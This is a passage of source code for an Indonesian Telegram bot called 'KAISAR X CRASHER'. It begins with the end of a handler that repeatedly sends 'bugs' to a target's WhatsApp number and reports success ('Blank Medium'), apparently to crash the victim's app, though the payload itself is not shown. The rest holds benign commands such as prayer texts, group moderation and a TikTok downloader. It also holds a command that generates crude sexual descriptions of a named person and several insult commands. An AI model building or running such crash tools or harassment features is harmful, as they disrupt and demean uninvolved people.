          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Blank Medium
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//------------------------------------------------------------------------------------------------------------------------------\\

// TOOLS MENU
const niatSholatList = [
  {
    solat: "subuh",
    latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
    arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
    translation_id: "Aku berniat shalat fardhu Subuh dua raka'at menghadap kiblat karena Allah Ta'ala",
  },
  {
    solat: "dzuhur",
    latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
    arabic: "اُصَلِّى فَرْضَ الظُّهْرِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
    translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
  },
  {
    solat: "ashar",
    latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
    arabic: "صَلِّى فَرْضَ الْعَصْرِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
    translation_id: "Aku berniat shalat fardhu Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
  },
  {
    solat: "maghrib",
    latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
    arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
    translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
  },
  {
    solat: "isya",
    latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
    arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
    translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
  }
];

/* ===================== COMMAND ===================== */

bot.onText(/\/niatsholat(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  let q = (match[1] || '').toLowerCase().trim();

  if (!q) {
    return bot.sendMessage(
      chatId,
      `📌 Contoh penggunaan:\n/niatsholat subuh\n\nList:\n• subuh\n• dzuhur\n• ashar\n• maghrib\n• isha`
    );
  }

  const data = niatSholatList.find(
    (item) => item.solat.toLowerCase() === q
  );

  if (!data) {
    return bot.sendMessage(
      chatId,
      `❌ Niat sholat "${q}" tidak ditemukan.\n\n📌 List tersedia:\n• subuh\n• dzuhur\n• ashar\n• maghrib\n• Isya`
    );
  }

  const hasil = `
🕌 *Niat Sholat ${capitalize(q)}*

📖 *Arab:*
${data.arabic}

🔤 *Latin:*
${data.latin}

📝 *Terjemahan:*
${data.translation_id}
  `.trim();

  bot.sendMessage(chatId, hasil, {
    parse_mode: 'Markdown'
  });
});

/* ===================== FUNCTION ===================== */

function capitalize(text) {
  return text.charAt(0).toUpperCase() + text.slice(1);
}

bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    let code = null;

    const reply = msg.reply_to_message;

    // Ambil dari balasan teks
    if (reply?.text) {
      code = reply.text;
    }

    // Ambil dari file .js
    else if (reply?.document) {
      const doc = reply.document;

      if (
        doc.mime_type === "application/javascript" ||
        doc.file_name.endsWith(".js")
      ) {
        const file = await bot.getFile(doc.file_id);
        const fileLink = `https://api.telegram.org/file/bot${token}/${file.file_path}`;

        const res = await fetch(fileLink);
        code = await res.text();
      }
    }

    if (!code) {
      return bot.sendMessage(chatId, "❌ Balas pesan teks error atau file .js dulu bre.");
    }

    await bot.sendMessage(chatId, "🧠 Otw gua bantu benerin kodenya ya bre...");

    const prompt = ` 
Lu adalah AI expert dalam memperbaiki semua kode pemrograman (seperti JavaScript, Python, C++, dll). Tugas lu:

1. Perbaiki kode yang error atau bermasalah tanpa penjelasan tambahan.
2. Langsung tulis ulang kodenya yang sudah diperbaiki.
3. Jangan kasih penjelasan, cukup kirim kodenya aja.
4. Kasih hasilnya pake format \`\`\`(bahasa pemograman) di awal dan \`\`\` di akhir.

Ini kodenya bre:

${code}
`;

    const url = `https://api.fasturl.link/aillm/gpt-4o?ask=${encodeURIComponent(prompt)}`;
    const response = await fetch(url);
    const data = await response.json();

    if (data?.result) {
      let result = data.result.trim();

      if (!result.includes("```")) {
        result = `\`\`\`javascript\n${result}\n\`\`\``;
      }

      if (result.length > 4000) {
        result = result.slice(0, 4000) + "...";
      }

      return bot.sendMessage(chatId, result, {
        parse_mode: "Markdown"
      });
    } else {
      bot.sendMessage(chatId, "❌ Gagal dapet balasan dari AI bre.");
    }
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi error pas proses perbaikan kode.");
  }
});

const dbPath = './antilink.json';
let antilink = fs.existsSync(dbPath)
  ? JSON.parse(fs.readFileSync(dbPath))
  : {};

/* ===================== COMMAND ===================== */
bot.onText(/\/antilink(?: (on|off))?/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const userId = msg.from.id;

  if (!['group', 'supergroup'].includes(msg.chat.type)) {
    return bot.sendMessage(chatId, '❌ Fitur ini hanya untuk grup.');
  }

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(a => a.user.id === userId);

  if (!isAdmin) {
    return bot.sendMessage(chatId, '❌ Lu bukan admin.');
  }

  const status = (match[1] || '').toLowerCase();

  if (status === 'on') {
    antilink[chatId] = true;
    fs.writeFileSync(dbPath, JSON.stringify(antilink, null, 2));

    return bot.sendMessage(chatId, '✅ AntiLink *AKTIF*', {
      parse_mode: 'Markdown'
    });

  } else if (status === 'off') {
    delete antilink[chatId];
    fs.writeFileSync(dbPath, JSON.stringify(antilink, null, 2));

    return bot.sendMessage(chatId, '❌ AntiLink *DIMATIKAN*', {
      parse_mode: 'Markdown'
    });

  } else {
    return bot.sendMessage(
      chatId,
      '📌 Gunakan:\n/antilink on\n/antilink off'
    );
  }
});

/* ===================== ANTI LINK MIDDLEWARE ===================== */
bot.on('message', async (msg) => {
  const chatId = msg.chat.id.toString();
  const text = msg.text || '';

  if (!antilink[chatId]) return;

  const linkRegex =
    /(https?:\/\/|t\.me\/|telegram\.me\/|chat\.whatsapp\.com|wa\.me\/)/i;

  if (!linkRegex.test(text)) return;

  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isAdmin = admins.some(a => a.user.id === msg.from.id);

    if (isAdmin) return;

    await bot.deleteMessage(chatId, msg.message_id);

    await bot.sendMessage(
      chatId,
      `🚫 @${msg.from.username || msg.from.first_name}\nJangan kirim link di grup ini!`
    );

  } catch (err) {
    console.log('AntiLink Error:', err.message);
  }
});

const wibu = [
  'WIBU LEVEL 4%\n\n🧍 Kamu masih manusia normal… untuk sekarang.',
  'WIBU LEVEL 7%\n\n📺 Baru nonton 1 episode langsung bilang “meh”.',
  'WIBU LEVEL 12%\n\n👀 Anime masuk, logika keluar dikit.',
  'WIBU LEVEL 22%\n\n⚠️ Deteksi awal: wallpaper mulai bergerak di pikiranmu.',
  'WIBU LEVEL 27%\n\n🍜 Kamu bilang “aku cuma casual” padahal udah hafal opening.',
  'WIBU LEVEL 35%\n\n📡 Sinyal Jepang mulai nyangkut di otak.',
  'WIBU LEVEL 41%\n\n💀 Kamu mulai ngomong “senpai” ke tembok.',
  'WIBU LEVEL 48%\n\n🧠 Separuh otak sudah pindah ke dimensi 2D.',
  'WIBU LEVEL 56%\n\n📦 Kurir figurine sudah hafal rumahmu.',
  'WIBU LEVEL 64%\n\n🎧 Kamu dengar lagu anime bahkan pas AC nyala.',
  'WIBU LEVEL 71%\n\n⚔️ Kamu siap duel demi waifu fiksi tanpa alasan.',
  'WIBU LEVEL 77%\n\n📛 REALITY WARNING: Kamu mulai nge-lag di dunia nyata.',
  'WIBU LEVEL 83%\n\n🌀 Sistem mendeteksi kamu hampir jadi NPC utama anime.',
  'WIBU LEVEL 89%\n\n💬 Kamu debat waifu jam 3 pagi dengan serius.',
  'WIBU LEVEL 94%\n\n🚨 Kamu bukan nonton anime… kamu sudah pindah server.',
  'WIBU LEVEL 100%\n\n☠️ SYSTEM FAILURE!\nKAMU SUDAH RESMI MENJADI KARAKTER ISEKAI YANG NYASAR DI DUNIA NYATA.',
  'WIBU LEVEL 100%\n\n💥 ERROR 404: REALITY NOT FOUND\nWAIFU HAS TAKEN CONTROL.',
  'WIBU LEVEL 100%\n\n🧾 STATUS: NPC DETECTED AS MAIN CHARACTER',
  'WIBU LEVEL 100%\n\n🌌 Kamu sekarang admin server “Anime Dimension Earth-69”',
  'WIBU LEVEL 100%\n\n🔁 LOOP ACTIVE: hidup → anime → waifu → tidur → ulang'
];

/* ===================== COMMAND ===================== */

bot.onText(/\/cekwibu/, (msg) => {
  const chatId = msg.chat.id;

  const result = wibu[Math.floor(Math.random() * wibu.length)];

  bot.sendMessage(chatId, `💀 ${result}`);
});

/* ===================== AYAT KURSI ===================== */
const ayatKursi = `
📖 *Ayat Kursi (QS. Al-Baqarah: 255)*

اللَّهُ لَا إِلَٰهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ ۚ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ ۚ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ ۗ مَنْ ذَا الَّذِي يَشْفَعُ عِندَهُ إِلَّا بِإِذْنِهِ ۚ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ ۖ وَلَا يُحِيطُونَ بِشَيْءٍ مِّنْ عِلْمِهِ إِلَّا بِمَا شَاءَ ۚ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ ۖ وَلَا يَئُودُهُ حِفْظُهُمَا ۚ وَهُوَ الْعَلِيُّ الْعَظِيمُ

📌 QS. Al-Baqarah: 255
`.trim();

bot.onText(/\/ayatkursi/, (msg) => {
  bot.sendMessage(msg.chat.id, ayatKursi, {
    parse_mode: 'Markdown'
  });
});

const bacaanshalat = [
  {
    name: "Bacaan Iftitah",
    arabic: "اللَّهُ أَكْبَرُ كَبِيرًا ... وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
    latin: "Alloohu akbar kabiirow wal hamdu lillaahi ... wa ana awwalul muslimiin",
    terjemahan: "Allah Maha Besar ... aku adalah orang pertama berserah diri"
  },
  {
    name: "Al Fatihah",
    arabic: "بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ ... وَلَا الضَّالِّيْنَ",
    latin: "Bismillahirrahmanirrahim ... waladhoollin",
    terjemahan: "Dengan nama Allah ... bukan jalan orang yang sesat"
  },
  {
    name: "Ruku",
    arabic: "سُبْحَانَ رَبِّيَ الْعَظِيمِ وَبِحَمْدِهِ (3x)",
    latin: "Subhana Rabbiyal Adzim wabihamdih (3x)",
    terjemahan: "Maha Suci Tuhanku Yang Maha Agung"
  },
  {
    name: "Sujud",
    arabic: "سُبْحَانَ رَبِّيَ الْأَعْلَى وَبِحَمْدِهِ (3x)",
    latin: "Subhana Rabbiyal A'la wabihamdih (3x)",
    terjemahan: "Maha Suci Tuhanku Yang Maha Tinggi"
  },
  {
    name: "Duduk antara 2 Sujud",
    arabic: "رَبِّ اغْفِرْ لِي وَارْحَمْنِي وَاجْبُرْنِي",
    latin: "Rabbighfirli warhamni ...",
    terjemahan: "Ya Allah ampunilah aku dan rahmatilah aku"
  },
  {
    name: "Tasyahud Awal",
    arabic: "التَّحِيَّاتُ الْمُبَارَكَاتُ ... مُحَمَّدٍ",
    latin: "Attahiyyatul mubarakatush sholawaatu ... Muhammad",
    terjemahan: "Segala penghormatan ... Nabi Muhammad"
  },
  {
    name: "Tasyahud Akhir",
    arabic: "التَّحِيَّاتُ ... إِنَّكَ حَمِيدٌ مَجِيدٌ",
    latin: "Attahiyyat ... innaka hamiidum majiid",
    terjemahan: "Segala penghormatan ... Engkau Maha Terpuji"
  },
  {
    name: "Salam",
    arabic: "السَّلَامُ عَلَيْكُمْ وَرَحْمَةُ اللّٰهِ",
    latin: "Assalamu'alaikum warahmatullah",
    terjemahan: "Semoga keselamatan dan rahmat Allah untuk kalian"
  }
];

/* ===================== COMMAND ===================== */
bot.onText(/\/bacaansholat/, (msg) => {
  const chatId = msg.chat.id;

  let text = "🕌 *Bacaan Sholat Lengkap*\n\n";

  bacaanshalat.forEach((item) => {
    text += `
*${item.name}*
📖 ${item.arabic}
🔤 ${item.latin}
📝 ${item.terjemahan}

`;
  });

  bot.sendMessage(chatId, text.trim(), {
    parse_mode: 'Markdown'
  });
});

bot.onText(/\/tiktok(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url || !url.includes('tiktok.com')) {
    return bot.sendMessage(
      chatId,
      '❌ Masukkan URL TikTok yang valid.\n\nContoh:\n/tiktok https://vt.tiktok.com/xxxx'
    );
  }

  const loadingMsg = await bot.sendMessage(
    chatId,
    '⏳ Mengambil video dari TikTok...'
  );

  try {
    const { data } = await axios.get(
      'https://restapi-v2.simplebot.my.id/download/tiktok',
      {
        params: { url }
      }
    );

    const result = data?.result;

    if (!data.status || !result?.video_nowm) {
      await bot.editMessageText(
        '❌ Gagal mengambil video TikTok.',
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
      return;
    }

    // kirim video tanpa watermark
    await bot.sendVideo(chatId, result.video_nowm, {
      caption: '🎥 Video TikTok (No Watermark)'
    });

    // kirim audio kalau ada
    if (result.audio_url) {
      await bot.sendAudio(chatId, result.audio_url, {
        title: '🎵 Audio TikTok'
      });
    }

    // hapus pesan loading
    await bot.deleteMessage(chatId, loadingMsg.message_id);
  } catch (err) {
    console.error('TikTok Error:', err.message);

    await bot.sendMessage(
      chatId,
      '⚠️ Terjadi kesalahan saat mengunduh video TikTok.'
    );
  }
});

bot.onText(/\/cekkontol(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Ketik Namanya Tolol!');
  }

  const kontolType = pickRandom([
    'ih item', 'Belang wkwk', 'Muluss',
    'Putih Mulus', 'Black Doff', 'Pink wow', 'Item Glossy'
  ]);

  const trueStatus = pickRandom([
    'perjaka', 'ga perjaka', 'udah pernah dimasukin',
    'masih ori', 'jumbo'
  ]);

  const jembutType = pickRandom([
    'lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'
  ]);

  const result = `
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┃• Kontol : ${kontolType}
┊• True : ${trueStatus}
┃• jembut : ${jembutType}
╰═┅═━––––––๑
  `.trim();

  bot.sendMessage(chatId, result, { parse_mode: 'Markdown' });
});

function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}
    
bot.onText(/\/donate/, async (msg) => {
  const chatId = msg.chat.id;

  const caption = `
\`\`\`js
╭───❏ *DONASI DUKUNG BOT KAISAR*
│🙏 𝑻𝒆𝒓𝒊𝒎𝒂 𝒌𝒂𝒔𝒊𝒉 𝒖𝒅𝒂𝒉 𝒎𝒂𝒖 𝒔𝒖𝒑𝒑𝒐𝒓𝒕 𝑺𝒂𝒌𝒂𝒕𝒂!
│💸 𝑺𝒄𝒂𝒏 𝑸𝑹𝑰𝑺 𝒅𝒊 𝒂𝒕𝒂𝒔 𝒖𝒏𝒕𝒖𝒌 𝒅𝒐𝒏𝒂𝒔𝒊.
│💸 Dana : 0815-4582-0428
│💸 Gopay : 0815-4582-0428
│
│📍 Donasi akan digunakan untuk:
│- Biaya Update KAISAR
│- Pengembangan fitur
│- Biaya Buat Server Apk
╰❏
\`\`\``;

  try {
    await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/23upqv.jpg",
      {
        caption: caption,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error("❌ Gagal kirim QRIS:", err.message);
    bot.sendMessage(chatId, "❌ Gagal kirim QRIS donasi bre.");
  }
});

bot.onText(/\/cektolol(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  const name =
    match[1] ||
    msg.reply_to_message?.from?.first_name ||
    'User';

  const percent = randomInt(1, 100);

  const result = generateResult(percent);
  const roast = pickRandom([
    '⚠️ Sistem mendeteksi Ke tolol an 99%',
    '💀 100% tolol itu bocah idiot',
    '🤖 AI hampir error, karena target udah gila',
    '📡 Signal otak terdeteksi naik turun tidak jelas',
    '🔥 Warning: tingkat kekacauan meningkat'
  ]);

  const message = `
👤 Target: *${name}*

📊 ANALISA SISTEM:
${roast}
━━━━━━━━━━━━━━
`.trim();

  await bot.sendMessage(chatId, message, {
    parse_mode: 'Markdown'
  });
});

/* ===================== CORE ===================== */

function generateResult(percent) {
  if (percent <= 10) {
    return `📉 ${percent}%\nNormal banget, aman terkendali 😎`;
  }

  if (percent <= 25) {
    return `📉 ${percent}%\nMasih waras, tapi ada indikasi random kecil 🤏`;
  }

  if (percent <= 45) {
    return `📊 ${percent}%\nStabil tapi otak kadang error dikit 🧠`;
  }

  if (percent <= 65) {
    return `📊 ${percent}%\nMulai gak konsisten, otak nya agak goyang ⚠️`;
  }

  if (percent <= 85) {
    return `📈 ${percent}%\nPerilaku tidak bisa diprediksi 💀`;
  }

  return `📈 ${percent}%\nFULL CHAOS MODE — SISTEM TIDAK DIREKOMENDASIKAN 🔥`;
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

bot.onText(/\/bisakah(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      '📌 Contoh:\n/bisakah aku jadian sama dia?'
    );
  }

  const loading = await bot.sendMessage(chatId, '🧠 AI sedang menganalisa...');

  await bot.sendChatAction(chatId, 'typing');
  await delay(800);

  const jawab = pickRandom([
    // ✅ POSITIF
    'Iya, kemungkinan besar 😏',
    'Bisa banget 🔥',
    'Peluangnya cukup besar 🤔',
    'Kalau kamu usaha, bisa 😎',
    'Masih sangat mungkin 💯',
    'Ada jalannya tolol santai 😹',

    // ⚖️ NETRAL
    'Tergantung situasi 😬',
    'Belum bisa dipastikan 😶',
    'Bisa iya bisa tidak 🤷',
    'Masih abu-abu ⚪',
    'Perlu usaha lebih 😐',

    // ❌ NEGATIF
    'Sepertinya sulit 😅',
    'Kemungkinannya kecil ❌',
    'Nggak terlalu mendukung 😬',
    'Kayaknya enggak deh 😏',
    'Lebih realistis jangan berharap 💀',

    // 😈 SINDIR SANTAI
    'Lu yakin itu bukan halu? 😹',
    'Coba cek realita dulu 😏',
    'Impian boleh, tapi sadar juga 😬',
    'Ini agak tolol sih 😭',
    'Gue nggak mau jahat, tapi... 💀'
  ]);

  const akurasi = Math.floor(Math.random() * 35) + 65;

  const response = `
╭──〔 🤖 AI KAISAR 〕──╮
│ 🌍 Pertanyaan:
│ _${text}_
│
│ 💬 Jawaban:
│ *${jawab}*
╰───────────────────╯
`;

  await bot.editMessageText(response, {
    chat_id: chatId,
    message_id: loading.message_id,
    parse_mode: 'Markdown',
    reply_to_message_id: msg.message_id
  });
});

// helper
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/* ================= CLEAN ================= */
function cleanCode(code) {
  return code
    .replace(/\r/g, "")
    .replace(/\t/g, "  ")
    .replace(/\u0000/g, "");
}

/* ================= SIMPLE PARSE ================= */
function safeParse(code) {
  try {
    new Function(code);
    return { ok: true };
  } catch (error) {
    return { ok: false, error };
  }
}

/* ================= SIMPLE ANALYZE ================= */
function analyzeCode(code) {
  let score = 100;
  let notes = [];

  if (code.includes("eval")) {
    score -= 20;
    notes.push("Hindari eval()");
  }

  if (code.length > 5000) {
    score -= 10;
    notes.push("Kode terlalu panjang");
  }

  let rating = score > 80 ? "Aman" : score > 60 ? "Cukup" : "Bahaya";

  return { score, notes, rating };
}

/* ================= DETECT DANGER ================= */
function detectDanger(code) {
  let warnings = [];

  if (code.includes("while(true)")) {
    warnings.push("⚠️ Infinite loop (while true)");
  }

  if (code.includes("for(;;)")) {
    warnings.push("⚠️ Infinite loop (for kosong)");
  }

  return warnings;
}

/* ================= HIGHLIGHT ERROR ================= */
function highlightError(code, lineNum) {
  const lines = code.split("\n");
  return lines.map((l, i) => {
    if (i + 1 === lineNum) return "👉 " + l;
    return "   " + l;
  }).slice(0, 20).join("\n");
}

/* ================= GET TEXT ================= */
async function getText(msg) {
  if (msg.reply_to_message.text) {
    return msg.reply_to_message.text;
  }
  return "";
}

/* ================= CEKFUNC ================= */
bot.onText(/\/cekfunc/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId, "Reply kode / file.");
    }

    let text = await getText(msg);
    if (!text || text.length < 5) {
      return bot.sendMessage(chatId, "Kode terlalu pendek / kosong.");
    }

    text = cleanCode(text);

    const parsed = safeParse(text);

    // ✅ VALID
    if (parsed.ok) {
      const { score, notes, rating } = analyzeCode(text);
      const warnings = detectDanger(text);

      return bot.sendMessage(
        chatId,
        `
✅ FUNCTION AMAN 🔥

📊 Score: ${score}/100
📝 ${notes.join(" | ") || "Aman"}
${warnings.length ? "\n" + warnings.join("\n") : ""}
`
      );
    }

    // ❌ ERROR
    const err = parsed.error;
    const line = err.lineNumber || 0;

    const preview = highlightError(text, line);

    return bot.sendMessage(
      chatId,
      `
❌ ERROR MAMPUS, JASFIX DM @dyyganteng123 
      
EROR DI:
${err.message}
`
    );

  } catch (e) {
    return bot.sendMessage(chatId, "❌ Terjadi error internal.");
  }
});

const warns = {};
bot.onText(/\/warn/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type === 'private') {
    return bot.sendMessage(chatId, '⚠️ Fitur ini hanya bisa digunakan di grup.');
  }

  // cek admin
  const member = await bot.getChatMember(chatId, msg.from.id);
  if (!['administrator', 'creator'].includes(member.status)) {
    return bot.sendMessage(chatId, '❌ Hanya admin yang bisa kasih warning.');
  }

  const repliedUser = msg.reply_to_message?.from;
  if (!repliedUser) {
    return bot.sendMessage(chatId, '⚠️ Balas pesan member yang mau di-warn.');
  }

  const groupId = chatId.toString();
  const userId = repliedUser.id.toString();

  if (!warns[groupId]) warns[groupId] = {};
  if (!warns[groupId][userId]) warns[groupId][userId] = 0;

  warns[groupId][userId] += 1;
  const totalWarn = warns[groupId][userId];

  const mention = repliedUser.username
    ? `@${repliedUser.username}`
    : repliedUser.first_name;

  // kalau sudah 3 warn → kick
  if (totalWarn >= 3) {
    try {
      await bot.banChatMember(chatId, repliedUser.id);

      await bot.sendMessage(
        chatId,
        `🚫 ${mention} sudah 3x kena warn dan telah dikick.`,
        { parse_mode: 'Markdown' }
      );

      warns[groupId][userId] = 0; // reset
    } catch (e) {
      bot.sendMessage(chatId, '❌ Gagal kick member. Pastikan bot adalah admin.');
    }
  } else {
    bot.sendMessage(
      chatId,
      `⚠️ ${mention} telah diberi warning ke-${totalWarn}`,
      { parse_mode: 'Markdown' }
    );
  }
});

const antimedia = new Set();
bot.onText(/\/antimedia(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.chat.type === 'private') {
    return bot.sendMessage(chatId, '❌ Grup Only.');
  }

  const member = await bot.getChatMember(chatId, msg.from.id);
  if (!['administrator', 'creator'].includes(member.status)) {
    return bot.sendMessage(chatId, '❌ Cuma admin yang bisa.');
  }

  const cmd = match[1];

  if (cmd === 'on') {
    antimedia.add(chatId);
    return bot.sendMessage(chatId, '✅ Anti Media ON');
  } else if (cmd === 'off') {
    antimedia.delete(chatId);
    return bot.sendMessage(chatId, '✅ Anti Media OFF');
  } else {
    return bot.sendMessage(chatId, '📌 /antimedia on | off');
  }
});

// DETEKSI MEDIA
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (!antimedia.has(chatId)) return;

  const isMedia =
    msg.photo ||
    msg.video ||
    msg.document ||
    msg.sticker ||
    msg.audio ||
    msg.voice;

  if (!isMedia) return;

  try {
    const member = await bot.getChatMember(chatId, msg.from.id);
    const isAdmin = ['administrator', 'creator'].includes(member.status);

    if (!isAdmin) {
      await bot.deleteMessage(chatId, msg.message_id);
    }
  } catch (e) {
    // gagal hapus (biasanya bot bukan admin)
  }
});

bot.onText(/^\/(open|close)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  
  // Cek apakah di grup
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya bisa di grup Telegram!');
  }

  // Cek apakah pengirim admin
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isOwner = admins.some(admin => admin.user.id === userId);
    if (!isOwner) return bot.sendMessage(chatId, '❌ Lu bukan admin bang!');

    if (command === 'close') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: false
      });
      return bot.sendMessage(chatId, '🔒 Grup telah *dikunci*! Hanya admin yang bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

    if (command === 'open') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      return bot.sendMessage(chatId, '🔓 Grup telah *dibuka*! Semua member bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

  } catch (err) {
    console.error('Gagal atur izin:', err);
    return bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengatur grup.');
  }
});

bot.onText(/\/mute(?:\s+(\d+[a-zA-Z]+|selamanya))?/, async (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @dyyganteng123 .",
            { parse_mode: "Markdown" }
        );
    }
  
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  let duration = 60; // default 60 detik
  const raw = match[1];

  if (raw) {
    if (raw.toLowerCase() === 'selamanya') {
      duration = 60 * 60 * 24 * 365 * 100; // 100 tahun
    } else {
      const regex = /^(\d+)(s|m|h|d|w|mo|y)$/i;
      const parts = raw.match(regex);
      if (parts) {
        const value = parseInt(parts[1]);
        const unit = parts[2].toLowerCase();
        const unitMap = { s: 1, m: 60, h: 3600, d: 86400, w: 604800, mo: 2592000, y: 31536000 };
        duration = value * (unitMap[unit] || 60);
      }
    }
  }

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk mute.");

  try {
    const until = Math.floor(Date.now() / 1000) + duration;
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: false,
      until_date: until,
    });
    bot.sendMessage(chatId, `🔇 User dimute selama ${raw || '60s'} (${duration} detik)`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal mute user.");
  }
});

// === UNMUTE ===
bot.onText(/\/unmute/, async (msg) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @dyyganteng123 .",
            { parse_mode: "Markdown" }
        );
    }


  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk unmute.");

  try {
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
    });
    bot.sendMessage(chatId, `🔊 User telah di-unmute.`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal unmute user.");
  }
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat Apongg');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

